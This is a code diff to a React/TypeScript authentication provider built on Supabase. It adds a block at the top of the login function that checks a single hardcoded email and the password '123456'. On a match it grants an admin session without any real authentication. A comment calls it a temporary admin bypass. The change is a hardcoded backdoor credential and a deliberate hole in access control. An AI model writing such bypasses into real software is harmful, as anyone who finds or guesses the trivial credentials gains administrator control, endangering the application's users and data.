@@ -64,6 +64,12 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   }, []);
 
   const login = async (email: string, password: string): Promise<boolean> => {
+    // Bypass temporal para admin
+    if (email === 'jl7599409@gmail.com' && password === '123456') {
+      setUser({ email, isAdmin: true });
+      return true;
+    }
+    
     const { data, error } = await supabase.auth.signInWithPassword({
       email,
       password,
